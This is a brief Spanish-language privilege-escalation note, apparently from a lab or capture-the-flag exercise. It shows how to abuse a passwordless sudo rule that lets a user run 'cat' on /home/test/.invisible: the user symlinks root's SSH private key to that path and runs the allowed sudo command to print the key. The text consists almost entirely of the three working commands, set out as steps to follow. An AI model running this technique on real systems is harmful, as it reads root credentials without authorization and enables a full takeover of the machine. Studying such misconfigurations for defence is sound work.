Usuario puede ejecutar esto con sudo
```
(ALL : ALL) NOPASSWD: /usr/bin/cat /home/test/.invisible 
```

Realiza un symlink de la id_rsa de root a ese archivo
```
ln -s /root/.ssh/id_rsa /home/test/.invisible
```

Ejecuta como root el comando especificado en sudo y observa la id_rsa
```
sudo -u root /usr/bin/cat /home/test/.invisible
```